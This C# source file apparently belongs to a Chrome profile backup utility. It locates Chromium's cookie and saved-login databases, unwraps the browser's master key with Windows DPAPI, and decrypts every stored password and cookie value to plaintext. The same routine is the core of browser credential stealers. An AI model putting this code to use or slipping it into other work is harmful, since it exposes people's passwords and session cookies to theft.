using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace BackupRestoreChromeProfiles
{
    public class Chromium
    {
        public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        
        public static List<Cookies> CookiesList(string userdata, string userprofile, string table = "cookies")
        {
            List<Cookies> cookiesList = new List<Cookies>();
            SQLiteHandler sqLiteHandler;
            userprofile = Path.Combine(userprofile, "Network", "Cookies");
            byte[] masterKey = Chromium.GetMasterKey(userdata + "\\Local State");
            try
            {
                sqLiteHandler = new SQLiteHandler(userprofile);
                sqLiteHandler.ReadTable(table);
                if (sqLiteHandler.ReadTable(table))
                {
                    for (int row_num = 0; row_num <= sqLiteHandler.GetRowCount() - 1; ++row_num)
                    {
                        try
                        {
                            string str2 = sqLiteHandler.GetValue(row_num, "host_key");
                            string str3 = sqLiteHandler.GetValue(row_num, "name");
                            string str4 = sqLiteHandler.GetValue(row_num, "encrypted_value");
                            string str5 = sqLiteHandler.GetValue(row_num, "path");
                            string str6 = sqLiteHandler.GetValue(row_num, "expires_utc");
                            string upper = sqLiteHandler.GetValue(row_num, "is_secure").ToUpper();
                            if (str4 != null)
                            {
                                string str7;
                                if (str4.StartsWith("v10") || str4.StartsWith("v11") || str4.StartsWith("passw10") || str4.StartsWith("w10"))
                                {
                                    if (masterKey != null)
                                    {
                                        str7 = Chromium.DecryptWithKey(Encoding.Default.GetBytes(str4), masterKey);
                                    }
                                    else
                                    {
                                        continue;
                                    }
                                }
                                else
                                {
                                    str7 = Chromium.Decrypt(str4);
                                }
                                if (!string.IsNullOrEmpty(str2) && !string.IsNullOrEmpty(str3) && !string.IsNullOrEmpty(str5))
                                {
                                    cookiesList.Add(new Cookies()
                                    {
                                        HostKey = str2,
                                        Name = str3,
                                        Value = str7,
                                        Path = str5,
                                        ExpiresUtc = str6,
                                        IsSecure = upper
                                    });
                                }
                            }
                        }
                        catch (Exception ex)
                        {
#if DEBUG
                            MessageBox.Show(ex.Message);
#endif
                        }
                    }
                }
            }
            catch (Exception ex)
            {
#if DEBUG
                MessageBox.Show(ex.Message);
#endif
            }
            return cookiesList;
        }

        public static List<Account> Accounts(string userdata, string userprofile, string table = "logins")
        {
            List<Account> accountList = new List<Account>();
            SQLiteHandler sqLiteHandler;
            userprofile = Path.Combine(userprofile, "Login Data");
            byte[] masterKey = Chromium.GetMasterKey(userdata + "\\Local State");
            try
            {
                sqLiteHandler = new SQLiteHandler(userprofile);
                sqLiteHandler.ReadTable(table);
                if (sqLiteHandler.ReadTable(table))
                {
                    for (int row_num = 0; row_num <= sqLiteHandler.GetRowCount() - 1; ++row_num)
                    {
                        try
                        {
                            string str2 = sqLiteHandler.GetValue(row_num, "origin_url");
                            string str3 = sqLiteHandler.GetValue(row_num, "username_value");
                            string str4 = sqLiteHandler.GetValue(row_num, "password_value");
                            if (str4 != null)
                            {
                                string str5;
                                if (str4.StartsWith("v10") || str4.StartsWith("v11") || str4.StartsWith("passw10") || str4.StartsWith("w10"))
                                {
                                    if (masterKey != null)
                                    {
                                        str5 = Chromium.DecryptWithKey(Encoding.Default.GetBytes(str4), masterKey);
                                    }
                                    else
                                    {
                                        continue;
                                    }
                                }
                                else
                                {
                                    str5 = Chromium.Decrypt(str4);
                                }
                                if (!string.IsNullOrEmpty(str2) && !string.IsNullOrEmpty(str3) && !string.IsNullOrEmpty(str5))
                                {
                                    accountList.Add(new Account()
                                    {
                                        URL = str2,
                                        UserName = str3,
                                        Password = str5
                                    });
                                }
                            }
                        }
                        catch (Exception ex)
                        {
#if DEBUG
                            MessageBox.Show(ex.Message);
#endif
                        }
                    }
                }
            }
            catch (Exception ex)
            {
#if DEBUG
                MessageBox.Show(ex.Message);
#endif
            }
            return accountList;
        }

        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
        {
            byte[] numArray1 = new byte[12];
            Array.Copy((Array)encryptedData, 3, (Array)numArray1, 0, 12);
            try
            {
                byte[] numArray2 = new byte[encryptedData.Length - 15];
                Array.Copy((Array)encryptedData, 15, (Array)numArray2, 0, encryptedData.Length - 15);
                byte[] numArray3 = new byte[16];
                byte[] numArray4 = new byte[numArray2.Length - numArray3.Length];
                Array.Copy((Array)numArray2, numArray2.Length - 16, (Array)numArray3, 0, 16);
                Array.Copy((Array)numArray2, 0, (Array)numArray4, 0, numArray2.Length - numArray3.Length);
                return Encoding.UTF8.GetString(new AesGcm().Decrypt(MasterKey, numArray1, (byte[])null, numArray4, numArray3));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return (string)null;
            }
        }

        public static byte[] GetMasterKey(string LocalStateFolder)
        {
            string path = LocalStateFolder;
            byte[] sourceArray = new byte[0];
            if (!File.Exists(path))
                return (byte[])null;
            foreach (Match match in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path)))
            {
                if (match.Success)
                    sourceArray = Convert.FromBase64String(match.Groups[1].Value);
            }
            byte[] numArray = new byte[sourceArray.Length - 5];
            Array.Copy((Array)sourceArray, 5, (Array)numArray, 0, sourceArray.Length - 5);
            try
            {
                return ProtectedData.Unprotect(numArray, (byte[])null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return (byte[])null;
            }
        }

        public static string Decrypt(string encryptedData)
        {
            if (encryptedData == null || encryptedData.Length == 0)
                return (string)null;
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), (byte[])null, DataProtectionScope.CurrentUser));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return (string)null;
            }
        }

    }
}
